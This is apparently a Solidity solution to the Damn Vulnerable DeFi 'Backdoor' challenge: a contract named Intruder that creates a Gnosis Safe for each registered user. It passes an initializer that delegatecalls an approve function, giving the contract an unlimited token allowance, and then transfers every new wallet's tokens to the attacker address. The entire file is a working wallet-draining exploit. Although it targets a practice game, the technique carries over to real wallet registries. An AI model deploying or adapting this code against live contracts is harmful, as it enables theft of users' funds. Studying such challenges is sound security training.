// SPDX-License-Identifier: NO-LICENSE
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "../DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";



interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}


contract Intruder {

    DamnValuableToken public token;
    GnosisSafeProxyFactory public factory;
    WalletRegistry public walletRegistry;
    address public singleton;
    address payable public attacker;

    constructor(
        address _factory,
        address _walletRegistry,
        address _singleton,
        address payable _attacker
    ) {
        factory = GnosisSafeProxyFactory(_factory);
        walletRegistry = WalletRegistry(_walletRegistry);
        singleton = _singleton;
        attacker = _attacker;
    }


    function approve(address spender, address _tokenAddy) external {
        IERC20(_tokenAddy).approve(spender, type(uint256).max);
    }

    function attack(address[] calldata users, address tokenAddy) external {
        require(msg.sender == attacker, "!attacker");

        for (uint256 i; i < users.length; i++) {
            // Create parameters for the call
            address user = users[i];
            address[] memory oneOwner = new address[](1);
            oneOwner[0] = user;

            bytes memory approveEncoded = abi.encodeWithSignature("approve(address,address)", address(this), tokenAddy);

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)", 
                oneOwner,           // owners
                1,                  // threshold
                address(this),     // to
                approveEncoded,         // data
                address(0),         // paymentToken
                address(0),         // fallbackHandler
                0,                  // payment
                address(0)          // paymentReceiver
            );

            // create proxy
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                initializer,
                0,
                IProxyCreationCallback(walletRegistry)
            );

            // require(token.allowance(address(this), address(proxy)) > 0, "Blyaa");

            //address safeAddress = walletRegistry.wallets(owners[i]);


            IERC20(tokenAddy).transferFrom(
                address(proxy),
                attacker,
                IERC20(tokenAddy).balanceOf(address(proxy))
            );

        }

        //token.transfer(msg.sender, token.balanceOf(address(this)));

    }



    


}
